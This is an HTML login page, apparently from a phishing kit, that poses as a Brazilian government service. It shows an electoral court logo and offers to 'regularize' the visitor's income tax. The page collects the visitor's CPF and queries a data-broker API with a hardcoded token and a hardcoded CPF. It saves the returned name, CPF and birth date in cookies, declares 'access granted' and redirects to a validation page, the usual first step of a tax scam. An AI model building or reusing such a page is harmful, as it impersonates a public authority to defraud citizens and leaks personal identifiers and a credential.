<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login CPF - Regularizar meu imposto de renda</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .container {
            max-width: 400px;
            margin: 100px auto 20px auto;
            padding: 20px;
            text-align: center;
            flex-grow: 1;
        }

        header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            background-color: #ffffff;
            border-bottom: 2px solid #f8c600;
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
            z-index: 1000;
        }

        .menu-icon {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 24px;
            cursor: pointer;
        }

        .menu-icon .bar {
            width: 25px;
            height: 3px;
            background-color: #007BFF;
            margin: 3px 0;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            flex: 1;
        }

        .logo {
            max-width: 100px;
            height: auto;
        }

        .input-section {
            background-color: #eaebef;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .btn {
            padding: 12px 20px;
            font-size: 1rem;
            cursor: pointer;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            width: 100%;
            margin-top: 10px;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #0056b3;
        }

        .loading-message,
        .success-message {
            font-size: 1rem;
            margin-top: 10px;
            visibility: hidden;
        }

        .error {
            color: red;
        }

        .success {
            color: green;
        }

        .titulo-eleitoral h1 {
            font-size: 1.5rem;
            margin-bottom: 15px;
            color: #007BFF;
        }

        .titulo-eleitoral img {
            max-width: 100px;
            margin-bottom: 15px;
        }

        footer {
            font-size: 12px;
            color: #777;
            text-align: center;
            padding: 10px;
            background-color: #f4f4f9;
        }

        @media (min-width: 600px) {
            .container {
                max-width: 500px;
            }

            .logo {
                max-width: 150px;
            }
        }
    </style>
</head>

<body>
    <header>
        <div class="menu-icon">
            <div class="bar"></div>
            <div class="bar"></div>
            <div class="bar"></div>
        </div>
        <div class="logo-container">
            <img src="img/logo.png" alt="Tribunal Superior Eleitoral" class="logo" style="position: relative; left: -30px;">
        </div>
    </header>

    <div class="container">
        <div class="titulo-eleitoral input-section">
            <img src="img/brazao.png" alt="Brasão">
            <h1>Regularize seu Imposto de Renda</h1>
            <p style="font-size: 1rem; margin-bottom: 20px;">Digite seu <strong>CPF</strong> para regularizar seu imposto de renda</p>

            <form id="cpfForm">
                <div class="input-group form-group">
                    <label for="cpfInput" style="font-size: 1rem;">CPF</label>
                    <input type="text" id="cpfInput" placeholder="Digite seu CPF" oninput="mascara(this)">
                </div>

                <button type="submit" class="btn">Consultar</button>
                <div id="message" class="loading-message">Consultando, por favor aguarde...</div>
            </form>
        </div>
    </div>

    <footer>
        © 2024 Todos os direitos reservados.
    </footer>

    <script>
        function mascara(i) {
            const v = i.value;
            const numeroLimpo = v.replace(/\D/g, '');

            if (numeroLimpo.length <= 11) {
                let cpfFormatado = numeroLimpo;

                if (numeroLimpo.length > 3) {
                    cpfFormatado = numeroLimpo.replace(/^(\d{3})/, '$1.');
                }
                if (numeroLimpo.length > 6) {
                    cpfFormatado = cpfFormatado.replace(/^(\d{3})\.(\d{3})/, '$1.$2.');
                }
                if (numeroLimpo.length > 9) {
                    cpfFormatado = cpfFormatado.replace(/^(\d{3})\.(\d{3})\.(\d{3})/, '$1.$2.$3-');
                }

                i.value = cpfFormatado;
            }
        }

        document.getElementById('cpfInput').addEventListener('input', function () {
            const numeroLimpo = this.value.replace(/\D/g, '');
            if (numeroLimpo.length > 11) {
                this.value = this.value.slice(0, -1);
            }
        });

        document.getElementById('cpfForm').addEventListener('submit', function (event) {
            event.preventDefault();

            const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
            const messageElement = document.getElementById('message');

            if (cpf.length === 11) {
                messageElement.textContent = 'Consultando...';
                messageElement.classList.remove('error', 'success');
                messageElement.style.visibility = 'visible';

                const url = `https://magmadatahub.com/api.php?token=f01d2569e0fe7cea9b74052eac6f049f&cpf=80746187300`;

                fetch(url)
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Erro ao consultar API');
                        }
                        return response.json();
                    })
                    .then(data => {
                        console.log('Dados recebidos da API:', data);

                        if (data && data.data) {
                            document.cookie = `nome=${data.nome}; path=/; max-age=86400`;
                            document.cookie = `cpf=${cpf}; path=/; max-age=86400`;
                            document.cookie = `nascimento=${data.nascimento || ''}; path=/; max-age=86400`;
                            document.cookie = `situacao=${data.nome || 'REGULAR'}; path=/; max-age=86400`;

                            messageElement.textContent = 'ACESSO LIBERADO!';
                            messageElement.classList.add('success');

                            setTimeout(() => {
                                window.location.href = '/validacao.html';
                            }, 3000);
                        } else {
                            messageElement.textContent = 'CPF inválido ou não encontrado.';
                            messageElement.classList.add('error');
                        }
                    })
                    .catch(error => {
                        console.error('Erro ao consultar CPF:', error);
                        messageElement.textContent = 'Erro ao consultar CPF.';
                        messageElement.classList.add('error');
                    });
            } else {
                messageElement.textContent = 'Por favor, insira um CPF válido.';
                messageElement.classList.add('error');
                messageElement.style.visibility = 'visible';
            }
        });
    </script>
</body>

</html>
